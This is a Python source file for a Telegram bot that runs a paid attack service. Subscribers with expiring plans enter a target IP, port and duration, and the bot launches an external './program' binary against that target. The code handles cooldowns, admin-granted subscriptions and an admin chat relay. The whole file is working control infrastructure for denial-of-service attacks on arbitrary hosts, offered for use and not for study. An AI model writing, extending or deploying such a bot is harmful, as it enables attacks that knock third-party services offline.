import os
import time
import json
import threading
import subprocess
import signal
from datetime import datetime, timedelta

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

MAIN_ADMIN = "5436530930"

MAX_ATTACK = 300
COOLDOWN = 1200
DEFAULT_THREADS = 2

USERS_FILE = "users.json"

# ================= STATE =================
running = {}
cooldown = {}
awaiting = set()
admin_chat = set()
lock = threading.Lock()

# ================= USERS =================
def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def save_users(data):
    with open(USERS_FILE, "w") as f:
        json.dump(data, f, indent=2)

users = load_users()

def get_role(uid):
    if uid == MAIN_ADMIN:
        return "main"
    return users.get(uid, {}).get("role")

def is_expired(uid):
    if uid == MAIN_ADMIN:
        return False
    user = users.get(uid)
    if not user:
        return True
    exp = datetime.fromisoformat(user["expires_at"])
    return datetime.now() > exp

# ================= UI =================
def menu(uid):
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🚀 Attack", callback_data="attack"),
        InlineKeyboardButton("📞 Contact Admin", callback_data="contact"),
    )
    if uid in running or uid == MAIN_ADMIN:
        kb.add(InlineKeyboardButton("🛑 Stop Attack", callback_data="stop"))
    return kb

def admin_menu():
    kb = InlineKeyboardMarkup()
    kb.add(InlineKeyboardButton("❌ End Admin Chat", callback_data="endchat"))
    return kb

# ================= CALLBACKS =================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = str(c.message.chat.id)

    if c.data == "attack":
        if is_expired(uid):
            bot.answer_callback_query(
                c.id,
                "Your plan has expired. Contact admin for renewal.",
                show_alert=True
            )
            return
        awaiting.add(uid)
        bot.edit_message_text(
            "Please enter:\n<code>IP PORT SECONDS</code>\n\nExample:\n<code>1.1.1.1 80 120</code>",
            uid,
            c.message.message_id,
            reply_markup=menu(uid)
        )

    elif c.data == "contact":
        admin_chat.add(uid)
        bot.edit_message_text(
            "💬 <b>Admin chat enabled</b>\nType your message.",
            uid,
            c.message.message_id,
            reply_markup=admin_menu()
        )

    elif c.data == "endchat":
        admin_chat.discard(uid)
        bot.edit_message_text(
            "✅ <b>Admin chat closed</b>",
            uid,
            c.message.message_id,
            reply_markup=menu(uid)
        )

    elif c.data == "stop":
        stop_attack(uid)
        bot.edit_message_text(
            "🛑 <b>Attack stopped</b>\n⏳ Cooldown: 20 minutes",
            uid,
            c.message.message_id,
            reply_markup=menu(uid)
        )

# ================= ADMIN CHAT =================
@bot.message_handler(func=lambda m: str(m.chat.id) in admin_chat and str(m.chat.id) != MAIN_ADMIN)
def relay_user(m):
    bot.send_message(MAIN_ADMIN, f"👤 User <code>{m.chat.id}</code>:\n{m.text}")

@bot.message_handler(func=lambda m: str(m.chat.id) == MAIN_ADMIN and m.reply_to_message)
def relay_admin(m):
    try:
        uid = m.reply_to_message.text.split("<code>")[1].split("</code>")[0]
        bot.send_message(uid, m.text)
    except:
        pass

# ================= ATTACK =================
def stop_attack(uid):
    with lock:
        p = running.pop(uid, None)
        if p:
            try:
                p.send_signal(signal.SIGTERM)
            except:
                pass
        cooldown[uid] = time.time()

@bot.message_handler(func=lambda m: str(m.chat.id) in awaiting)
def receive_attack(m):
    uid = str(m.chat.id)
    awaiting.discard(uid)

    if is_expired(uid):
        bot.send_message(uid, "Your plan has expired.", reply_markup=menu(uid))
        return

    if uid != MAIN_ADMIN:
        last = cooldown.get(uid)
        if last and time.time() - last < COOLDOWN:
            bot.send_message(uid, "You can do your next attack after 20 minutes", reply_markup=menu(uid))
            return

    try:
        ip, port, sec = m.text.split()
        sec = int(sec)
        if sec > MAX_ATTACK:
            raise ValueError
    except:
        bot.send_message(uid, "Invalid format", reply_markup=menu(uid))
        return

    p = subprocess.Popen(
        ["./program", "start", ip, port, str(sec), str(DEFAULT_THREADS)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    with lock:
        running[uid] = p

    bot.send_message(uid, f"✅ <b>Attack Started</b>\nTarget: {ip}\nTime: {sec}s", reply_markup=menu(uid))

    def wait_done():
        p.wait()
        with lock:
            running.pop(uid, None)
            cooldown[uid] = time.time()
        bot.send_message(uid, "✅ <b>Attack completed</b>\n⏳ Cooldown: 20 minutes", reply_markup=menu(uid))

    threading.Thread(target=wait_done, daemon=True).start()

# ================= ADMIN COMMANDS =================
@bot.message_handler(commands=["adduser", "addadmin"])
def add_user(m):
    if str(m.chat.id) != MAIN_ADMIN:
        return
    try:
        _, uid, days = m.text.split()
        days = int(days)
        role = "admin" if m.text.startswith("/addadmin") else "user"
        expires = datetime.now() + timedelta(days=days)
        users[uid] = {"role": role, "expires_at": expires.isoformat()}
        save_users(users)
        bot.reply_to(m, f"✅ {role} {uid} added for {days} days")
    except:
        bot.reply_to(m, "Usage: /adduser <id> <days>")

@bot.message_handler(commands=["remove"])
def remove_user(m):
    if str(m.chat.id) != MAIN_ADMIN:
        return
    try:
        _, uid = m.text.split()
        users.pop(uid, None)
        save_users(users)
        bot.reply_to(m, f"Removed {uid}")
    except:
        bot.reply_to(m, "Usage: /remove <id>")

# ================= START =================
@bot.message_handler(commands=["start"])
def start(m):
    uid = str(m.chat.id)
    bot.send_message(uid, "👋 <b>Welcome</b>\nChoose an option:", reply_markup=menu(uid))

# ================= RUN =================
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(3)
